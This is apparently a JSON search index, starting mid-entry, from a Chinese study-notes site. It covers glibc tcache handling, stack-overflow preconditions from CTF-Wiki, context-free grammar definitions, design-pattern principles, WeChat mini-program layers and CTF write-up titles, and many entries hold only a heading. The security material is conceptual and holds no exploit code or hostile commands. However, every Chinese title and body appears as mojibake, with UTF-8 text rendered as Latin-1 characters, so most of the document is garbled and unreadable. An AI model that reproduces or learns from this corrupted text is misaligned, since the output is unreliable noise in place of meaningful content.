ä¸­çš„ä»‹ç»ï¼Œä¸»è¦æœ‰ä»¥ä¸‹çš„å‡ ç‚¹ï¼š\n  é¦–å…ˆï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ fastbin å¤§å°æ—¶å¹¶ä¸”æ‰¾åˆ°åœ¨ fastbin å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥ fastbin é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥ tcache ä¸­ã€‚\n  å…¶æ¬¡ï¼Œç”³è¯·çš„å†…å­˜å—ç¬¦åˆ smallbin å¤§å°æ—¶å¹¶ä¸”æ‰¾åˆ°åœ¨ smallbin å†…æ‰¾åˆ°å¯ç”¨çš„ç©ºé—²å—æ—¶ï¼Œä¼šæŠŠè¯¥ smallbin é“¾ä¸Šçš„å…¶ä»–å†…å­˜å—æ”¾å…¥ tcache ä¸­ã€‚\n  å½“åœ¨ unsorted bin é“¾ä¸Šå¾ªç¯å¤„ç†æ—¶ï¼Œå½“æ‰¾åˆ°å¤§å°åˆé€‚çš„é“¾æ—¶ï¼Œå¹¶ä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯å…ˆæ”¾åˆ° tcache ä¸­ï¼Œç»§ç»­å¤„ç†ã€‚\n  "},{"id":433,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/","title":"01","section":"æ¶æ„ä»£ç åˆ†æ","content":"01 #  "},{"id":434,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/","title":"03","section":"æ¶æ„ä»£ç åˆ†æ","content":"03 #  "},{"id":435,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/","title":"04","section":"æ¶æ„ä»£ç åˆ†æ","content":"04 #  "},{"id":436,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/05/","title":"05","section":"æ¶æ„ä»£ç åˆ†æ","content":"05 #  "},{"id":437,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/","title":"06","section":"æ¶æ„ä»£ç åˆ†æ","content":"06 #  "},{"id":438,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/","title":"07","section":"æ¶æ„ä»£ç åˆ†æ","content":"07 #  "},{"id":439,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/","title":"09","section":"æ¶æ„ä»£ç åˆ†æ","content":"09 #  "},{"id":440,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"1.åˆ›å»ºå‹æ¨¡å¼","section":"DesignPatterns","content":"1.åˆ›å»ºå‹æ¨¡å¼ #  "},{"id":441,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/","title":"1.å®¢æˆ·ç«¯å®‰å…¨","section":"ç™½å¸½å­è®²WEBå®‰å…¨","content":"1.å®¢æˆ·ç«¯å®‰å…¨ #  "},{"id":442,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E7%89%A9%E7%90%86%E5%B1%82/","title":"1.ç‰©ç†å±‚","section":"è®¡ç®—æœºç½‘ç»œ","content":"1.ç‰©ç†å±‚ #  "},{"id":443,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/","title":"2.æœåŠ¡ç«¯å®‰å…¨","section":"ç™½å¸½å­è®²WEBå®‰å…¨","content":"2.æœåŠ¡ç«¯å®‰å…¨ #  "},{"id":444,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"2.ç»“æ„å‹æ¨¡å¼","section":"DesignPatterns","content":"2.ç»“æ„å‹æ¨¡å¼ #  "},{"id":445,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/","title":"2.è¯­æ³•åˆ†æ","section":"ç¼–è¯‘åŸç†","content":" å­¦ä¹ åœ°å€ï¼š\nå›½é˜²ç§‘æŠ€å¤§å­¦MOOC\n ç®€è¿°æ¦‚å¿µ #  ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼š\n å®šä¹‰ï¼šä¸€ä¸ªä¸Šä¸‹æ–‡æ— å…³æ–‡æ³• G æ˜¯ä¸€ä¸ªå››å…ƒå¼ $$G= (V_T, V_N, S, P)$$ï¼Œå…¶ä¸­ï¼š  $$V_T$$ï¼šç»ˆç»“ç¬¦å·é›†åˆï¼ˆéç©ºï¼‰ï¼› $$V_N$$ï¼šéç»ˆç»“ç¬¦é›†åˆï¼ˆéç©ºï¼‰ï¼Œä¸” $$V_T \\cap V_N = \\varnothing$$ $$S$$ï¼šæ–‡æ³•çš„å¼€å§‹ç¬¦å·ï¼Œ$$S \\in V_N$$ $$P$$ï¼šäº§ç”Ÿå¼é›†åˆï¼ˆæœ‰é™ï¼‰ï¼Œæ¯ä¸ªäº§ç”Ÿå¼å½¢å¼ä¸ºï¼š  $$P \\rightarrow \\alpha, P \\in V_N, \\alpha \\in (V_T \\cup V_N)*$$      ç›´æ¥æ¨å‡ºï¼š\n å®šä¹‰ï¼šç§° $$\\alpha A \\beta$$ ç›´æ¥æ¨å‡º $$\\alpha \\gamma \\beta$$ï¼Œå³ï¼š$$\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta$$ã€‚ä»…å½“ $$A \\rightarrow \\gamma $$ æ˜¯ä¸€ä¸ªäº§ç”Ÿå¼ï¼Œä¸” $$\\alpha, \\beta \\in (V_T \\cup V_N)*$$  æ¨å¯¼ï¼š\n å¦‚æœ $$\\alpha_1 \\Rightarrow \\alpha_2 \\Rightarrow \u0026hellip; \\Rightarrow \\alpha_n$$ï¼Œåˆ™æˆ‘ä»¬ç§°è¿™ä¸ªåºåˆ—æ˜¯ä» $$\\alpha_1$$ åˆ° $$\\alpha_n$$ çš„ä¸€ä¸ªæ¨å¯¼ã€‚è‹¥å­˜åœ¨ä¸€ä¸ªä» $$\\alpha_1$$ åˆ° $$\\alpha_n$$ çš„æ¨å¯¼ï¼Œåˆ™ç§° $$\\alpha_1$$ å¯ä»¥æ¨å¯¼å‡º $$\\alpha_n$$ã€‚  å¥å‹ï¼š\n å®šä¹‰ï¼šå‡å®š G æ˜¯ä¸€ä¸ªæ–‡æ³•ï¼ŒS æ˜¯å®ƒçš„å¼€å§‹ç¬¦å·ã€‚å¦‚æœ $$S \\Rightarrow \\alpha$$ï¼Œåˆ™ $$\\alpha$$ ç§°æ—¶ä¸€ä¸ªå¥å‹ã€‚ ç”±æ–‡æ³•çš„å¼€å§‹ç¬¦å·èƒ½å¤Ÿæ¨å¯¼å‡ºçš„ä»»æ„ä¸²ï¼Œéƒ½æ˜¯è¯¥æ–‡æ³•çš„ä¸€ä¸ªå¥å‹ã€‚  å¥å­ï¼šä»…å«ç»ˆç»“ç¬¦å·çš„å¥å‹ã€‚\nè¯­è¨€ï¼š\n æ–‡æ³•æ‰€äº§ç”Ÿçš„å¥å­çš„å…¨ä½“æ˜¯ä¸€ä¸ªè¯­è¨€ï¼Œå°†å®ƒè®°ä½œ $$L(G)$$ã€‚  $$L(G) = {\\alpha | S \\Rightarrow \\alpha, \\alpha \\in V_T^*}$$    è¯­æ³•åˆ†æä»»åŠ¡ï¼šåˆ†æä¸€ä¸ªæ–‡æ³•çš„å¥å­çš„ç»“æ„\nè¯­æ³•åˆ†æå™¨çš„åŠŸèƒ½ï¼šæŒ‰ç…§æ–‡æ³•çš„äº§ç”Ÿå¼ï¼ˆè¯­è¨€çš„è¯­æ³•è§„åˆ™ï¼‰ï¼Œè¯†åˆ«è¾“å…¥ç¬¦å·ä¸²æ˜¯å¦ä¸ºä¸€ä¸ªå¥å­ï¼ˆåˆå¼ç¨‹åºï¼‰\n"},{"id":446,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/","title":"2.è¿›ç¨‹ä¸çº¿ç¨‹","section":"æ“ä½œç³»ç»Ÿ","content":"è¿›ç¨‹ä¸çº¿ç¨‹ #  "},{"id":447,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"2.é“¾è·¯å±‚","section":"è®¡ç®—æœºç½‘ç»œ","content":"2.é“¾è·¯å±‚ #  "},{"id":448,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019de1ctf/","title":"2019de1ctf","section":"CTF-WriteUp","content":"2019De1Ctf #  "},{"id":449,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/2019ogeek/","title":"2019OGeek","section":"CTF-WriteUp","content":"2019OGeek #  "},{"id":450,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/","title":"3.LogicLayer","section":"WxMiniProgram","content":"è§†å›¾å±‚ #  é€»è¾‘å±‚å°†æ•°æ®è¿›è¡Œå¤„ç†åå‘é€ç»™è§†å›¾å±‚ï¼ŒåŒæ—¶æ¥å—è§†å›¾å±‚çš„äº‹ä»¶åé¦ˆã€‚\nå¼€å‘è€…å†™çš„æ‰€æœ‰ä»£ç æœ€ç»ˆå°†ä¼šæ‰“åŒ…æˆä¸€ä»½ JavaScript æ–‡ä»¶ï¼Œå¹¶åœ¨å°ç¨‹åºå¯åŠ¨çš„æ—¶å€™è¿è¡Œï¼Œç›´åˆ°å°ç¨‹åºé”€æ¯ã€‚è¿™ä¸€è¡Œä¸ºç±»ä¼¼ ServiceWorkerï¼Œæ‰€ä»¥é€»è¾‘å±‚ä¹Ÿç§°ä¹‹ä¸º App Serviceã€‚\nåœ¨ JavaScript çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¢åŠ äº†ä¸€äº›åŠŸèƒ½ï¼Œä»¥æ–¹ä¾¿å°ç¨‹åºçš„å¼€å‘ï¼š\n å¢åŠ  App å’Œ Page æ–¹æ³•ï¼Œè¿›è¡Œç¨‹åºå’Œé¡µé¢çš„æ³¨å†Œã€‚ å¢åŠ  getApp å’Œ getCurrentPages æ–¹æ³•ï¼Œåˆ†åˆ«ç”¨æ¥è·å– App å®ä¾‹å’Œå½“å‰é¡µé¢æ ˆã€‚ æä¾›ä¸°å¯Œçš„ APIï¼Œå¦‚å¾®ä¿¡ç”¨æˆ·æ•°æ®ï¼Œæ‰«ä¸€æ‰«ï¼Œæ”¯ä»˜ç­‰å¾®ä¿¡ç‰¹æœ‰èƒ½åŠ›ã€‚ æ¯ä¸ªé¡µé¢æœ‰ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œå¹¶æä¾›æ¨¡å—åŒ–èƒ½åŠ›ã€‚  æ³¨æ„ï¼šå°ç¨‹åºæ¡†æ¶çš„é€»è¾‘å±‚å¹¶éè¿è¡Œåœ¨æµè§ˆå™¨ä¸­ï¼Œå› æ­¤ JavaScript åœ¨ web ä¸­ä¸€äº›èƒ½åŠ›éƒ½æ— æ³•ä½¿ç”¨ï¼Œå¦‚ windowï¼Œdocumentç­‰ã€‚\n"},{"id":451,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"3.ç½‘ç»œå±‚","section":"è®¡ç®—æœºç½‘ç»œ","content":"3.ç½‘ç»œå±‚ #  "},{"id":452,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"3.è¡Œä¸ºå‹æ¨¡å¼","section":"DesignPatterns","content":"3.è¡Œä¸ºå‹æ¨¡å¼ #  "},{"id":453,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/","title":"4.Block-Hash-MAC","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 4. Design of Block Ciphers, Hash Functions, and MAC #  "},{"id":454,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/4.viewlayer/","title":"4.ViewLayer","section":"WxMiniProgram","content":"è§†å›¾å±‚ #  æ¡†æ¶çš„è§†å›¾å±‚ç”± WXML ä¸ WXSS ç¼–å†™ï¼Œç”±ç»„ä»¶æ¥è¿›è¡Œå±•ç¤ºã€‚\nå°†é€»è¾‘å±‚çš„æ•°æ®ååº”æˆè§†å›¾ï¼ŒåŒæ—¶å°†è§†å›¾å±‚çš„äº‹ä»¶å‘é€ç»™é€»è¾‘å±‚ã€‚\nWXML(WeiXin Markup language) ç”¨äºæè¿°é¡µé¢çš„ç»“æ„ã€‚\nWXS(WeiXin Script) æ˜¯å°ç¨‹åºçš„ä¸€å¥—è„šæœ¬è¯­è¨€ï¼Œç»“åˆ WXMLï¼Œå¯ä»¥æ„å»ºå‡ºé¡µé¢çš„ç»“æ„ã€‚\nWXSS(WeiXin Style Sheet) ç”¨äºæè¿°é¡µé¢çš„æ ·å¼ã€‚\nç»„ä»¶(Component)æ˜¯è§†å›¾çš„åŸºæœ¬ç»„æˆå•å…ƒã€‚\n"},{"id":455,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/","title":"4.ä¼ è¾“å±‚","section":"è®¡ç®—æœºç½‘ç»œ","content":"4.ä¼ è¾“å±‚ #  "},{"id":456,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82/","title":"5.åº”ç”¨å±‚","section":"è®¡ç®—æœºç½‘ç»œ","content":"5.åº”ç”¨å±‚ #  "},{"id":457,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/","title":"7.1.StackOverflow","section":"CTF-Wiki","content":"7.1.StackOverflow #  å¯¹äºç¨‹åºçš„æ ˆåŒºï¼Œä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š\n ç¨‹åºçš„æ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„ x86 çš„å‡½æ•°å‚æ•°åœ¨å‡½æ•°è¿”å›åœ°å€çš„ä¸Šé¢ï¼›x64 ç¨‹åºçš„å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‹å‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ RDIã€RSIã€RDXã€RCXã€R8ã€R9 å…­ä¸ªå¯„å­˜å™¨ä¸­ï¼ˆLinuxã€FreeFSDã€macOS é‡‡ç”¨ï¼‰ï¼Œæ›´å¤šå‚æ•°åˆ™ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚ x64 çš„åœ°å€é•¿åº¦ä¸èƒ½è¶…è¿‡ 0x0000 7FFF FFFF FFFF å…­ä¸ªå­—èŠ‚é•¿åº¦ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚  å‘ç”Ÿæ ˆæº¢å‡ºçš„åŸç†æ˜¯ï¼š\n å‘ç¨‹åºä¸­å†™å…¥çš„å­—èŠ‚æ•°ï¼Œè¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå¯¼è‡´å†™å…¥éæ³•çš„ä½ç½®ã€‚  è¿™ç§ç¼“å†²åŒºæº¢å‡ºæ¼æ´é™¤äº†å‘ç”Ÿåœ¨æ ˆä¸Šï¼Œä¹Ÿä»¥åŒæ ·çš„åŸç†å‘ç”Ÿåœ¨äº†å †ã€bss ç­‰ä¸Šã€‚\nå¯è§å‘ç”Ÿæ ˆæº¢å‡ºæˆ–ä»»ä½•å…¶ä»–æ®µçš„æº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯ï¼š\n ç¨‹åºå¿…é¡»å‘å†…å­˜ä¸­å†™å…¥æ•°æ® å†™å…¥æ•°æ®çš„å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶  "},{"id":458,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.3.glibcheap/","title":"7.3.GlibcHeap","section":"CTF-Wiki","content":"7.3.GlibcHeap #  å…ˆäº†è§£ glibc çš„å †ç»“æ„ä¸å®ç°æµç¨‹ï¼šglibc å †\n"},{"id":459,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","title":"Androidé€†å‘åˆ†æ","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å­¦ä¹ é€”å¾„\n ä¸°ç”Ÿå¼ºè‘— ã€ŠAndroid è½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æã€‹   README #  "},{"id":460,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/","title":"C#","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"C# #  "},{"id":461,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/","title":"codeacademy","section":"JAVA","content":" å­¦ä¹ é€”å¾„ï¼š\n codeacademy JAVA è¯¾ç¨‹   JAVA #  "},{"id":462,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/","title":"CSAPP","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"Computer Systems A Programmer\u0026rsquo;s Perspective #  "},{"id":463,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/ctf-wiki/","title":"ctf-wiki","section":"CTF-WriteUp","content":"ctf-wiki #  ctf-wki ä¸Šæ”¶å½•çš„ç¤ºä¾‹é¢˜ç›®ã€‚\n"},{"id":464,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/","title":"CTF-Wiki","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"CTFWiki #  "},{"id":465,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/","title":"CTF-WriteUp","section":"æ‚é¡¹åšå®¢","content":"é¢˜ç›® #  "},{"id":466,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","title":"DesignPatterns","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å‚è€ƒèµ„æ–™ï¼š\n æ¥æºï¼šã€ŠDesign Patterns - Elements of Reusable Object-Oriented Softwareã€‹ èœé¸Ÿæ•™ç¨‹ï¼šhttps://www.runoob.com/design-pattern/factory-pattern.html   è®¾è®¡æ¨¡å¼ #  ç±»å‹ #  æ ¹æ®è®¾è®¡æ¨¡å¼çš„å‚è€ƒä¹¦ ä¸­æ‰€æåˆ°çš„ï¼Œæ€»å…±æœ‰ 23 ç§è®¾è®¡æ¨¡å¼ã€‚\nè¿™äº›æ¨¡å¼å¯ä»¥åˆ†ä¸ºä¸‰å¤§ç±»ï¼šåˆ›å»ºå‹æ¨¡å¼ï¼ˆCreational Patternsï¼‰ã€ç»“æ„å‹æ¨¡å¼ï¼ˆStructural Patternsï¼‰ã€è¡Œä¸ºå‹æ¨¡å¼ï¼ˆBehavioral Patternsï¼‰ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜ä¼šè®¨è®ºå¦ä¸€ç±»è®¾è®¡æ¨¡å¼ï¼šJ2EE è®¾è®¡æ¨¡å¼ã€‚\n   æ¨¡å¼åˆ†ç±» æè¿°     åˆ›å»ºå‹æ¨¡å¼ è¿™äº›è®¾è®¡æ¨¡å¼æä¾›äº†ä¸€ç§åœ¨åˆ›å»ºå¯¹è±¡çš„åŒæ—¶éšè—åˆ›å»ºé€»è¾‘çš„æ–¹å¼ã€‚\nè¿™ä½¿å¾—ç¨‹åºåœ¨åˆ¤æ–­é’ˆå¯¹æŸä¸ªç»™å®šå®ä¾‹éœ€è¦åˆ›å»ºå“ªäº›å¯¹è±¡æ—¶æ›´åŠ çµæ´»ã€‚   ç»“æ„å‹æ¨¡å¼ è¿™äº›è®¾è®¡æ¨¡å¼å…³æ³¨ç±»å’Œå¯¹è±¡çš„ç»„åˆã€‚\nç»§æ‰¿çš„æ¦‚å¿µè¢«ç”¨æ¥ç»„åˆæ¥å£å’Œå®šä¹‰ç»„åˆå¯¹è±¡è·å¾—æ–°åŠŸèƒ½çš„æ–¹å¼ã€‚   è¡Œä¸ºå‹æ¨¡å¼ è¿™äº›è®¾è®¡æ¨¡å¼ç‰¹åˆ«å…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ã€‚   J2EE æ¨¡å¼ è¿™äº›è®¾è®¡æ¨¡å¼ç‰¹åˆ«å…³æ³¨è¡¨ç¤ºå±‚ã€‚è¿™äº›æ¨¡å¼æ˜¯ç”± Sun Java Center é‰´å®šçš„ã€‚    åŸåˆ™ #  è®¾è®¡æ¨¡å¼çš„å…­å¤§åŸåˆ™ï¼š\n å¼€é—­åŸåˆ™ï¼ˆOpen Close Principleï¼‰ï¼šå¯¹æ‰©å±•å¼€æ”¾ã€å¯¹ä¿®æ”¹å…³é—­ã€‚  åœ¨ç¨‹åºéœ€è¦æ‰©å±•åŠŸèƒ½æ—¶ï¼Œå¯ä»¥å®ç° hot-pluginsï¼› ç¨‹åºå®ç°æ‰©å±•æ—¶ï¼Œä¸èƒ½å¯¹æ—¢æœ‰çš„ä»£ç è¿›è¡Œä¿®æ”¹ï¼›   é‡Œæ°ä»£æ¢åŸåˆ™ï¼ˆLiskov Substitution Principleï¼‰ï¼šä»»ä½•åŸºç±»å¯ä»¥å‡ºç°çš„åœ°æ–¹ï¼Œå­ç±»ä¸€å®šå¯ä»¥å‡ºç°ã€‚ ä¾èµ–å€’è½¬åŸåˆ™ï¼ˆDependence Inversion Principleï¼‰ï¼šé’ˆå¯¹æ¥å£ç¼–ç¨‹ï¼Œä¾èµ–äºæŠ½è±¡è€Œä¸ä¾èµ–äºå…·ä½“ã€‚ æ¥å£éš”ç¦»åŸåˆ™ï¼ˆInterface Segregation Principleï¼‰ï¼šä½¿ç”¨å¤šä¸ªéš”ç¦»çš„æ¥å£ï¼Œæ¯”ä½¿ç”¨å•ä¸ªæ¥å£å¥½ã€‚ä¹Ÿå¯ä»¥è¯´æ˜¯é™ä½ç±»ä¹‹é—´çš„è€¦åˆåº¦ï¼› è¿ªç±³ç‰¹æ³•åˆ™ï¼Œæˆ–æœ€å°‘çŸ¥é“åŸåˆ™ï¼ˆDemeter Principleï¼‰ï¼šä¸€ä¸ªå®ä½“åº”å½“å°½é‡å°‘åœ°äºå…¶ä»–å®ä½“ä¹‹é—´å‘ç”Ÿç›¸äº’ä½œç”¨ï¼Œä½¿å¾—ç³»ç»ŸåŠŸèƒ½æ¨¡å—ç›¸å¯¹ç‹¬ç«‹ï¼› åˆæˆå¤ç”¨åŸåˆ™ï¼ˆComposite Reuse Principleï¼‰ï¼šå°½é‡ä½¿ç”¨åˆæˆçš„æ–¹å¼è€Œä¸æ˜¯ç»§æ‰¿ã€‚  "},{"id":467,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/","title":"Django","section":"Python","content":"README #  å­¦ä¹  Python Django WEB æ¡†æ¶çš„å­¦ä¹ ç¬”è®°ã€‚\n"},{"id":468,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/draveness/","title":"Draveness","section":"Golang","content":" Golangï¼š\n https://draveness.me/golang/   README #   æˆ‘ä»¬åœ¨å·¥ä¸šç•Œéœ€è¦è¿™ä¹ˆä¸€é—¨è¯­æ³•ç®€å•çš„ç¼–è¯‘å‹è¯­è¨€ï¼Œå®ƒèƒ½å¤Ÿæä¾›ç®€å•çš„æŠ½è±¡å’Œæ¦‚å¿µï¼Œè™½ç„¶ç›®å‰ Go è¯­è¨€ä¹Ÿæœ‰å¾ˆå¤šé—®é¢˜ï¼Œä½†æ˜¯è¯­è¨€ä»¥åŠå‘¨è¾¹å·¥å…·çš„ä¸æ–­å®Œå–„ä¹Ÿè®©ä½œè€…æ„Ÿå—åˆ°äº†ç¤¾åŒºçš„æ´»åŠ›ï¼Œä¹Ÿåšå®šåœ°è®¤ä¸ºè¿™é—¨è¯­è¨€æœªæ¥çš„å‘å±•ä¼šè¶Šæ¥æ„ˆå¥½ã€‚\n åœ¨äº’è”ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªç›¸å½“å‡ºè‰²çš„å­¦ä¹ æ•™æï¼Œè¿™ä¸ªæ•™æé€šè¿‡ç¼–è¯‘äº§ç‰©åˆ†æä¸å†…å­˜åˆ†æå¯¹ Go æœ‰è¯¦ç»†çš„äº†è§£ã€‚\n"},{"id":469,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/","title":"Flask","section":"Python","content":"Flask #  "},{"id":470,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/","title":"functional","section":"JavaScript","content":"å‡½æ•°å¼ç¼–ç¨‹ #  å‚è€ƒèµ„æ–™ï¼š\n åŸæ–‡ï¼šhttps://github.com/MostlyAdequate/mostly-adequate-guide è¯‘æ–‡ï¼šhttps://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.html  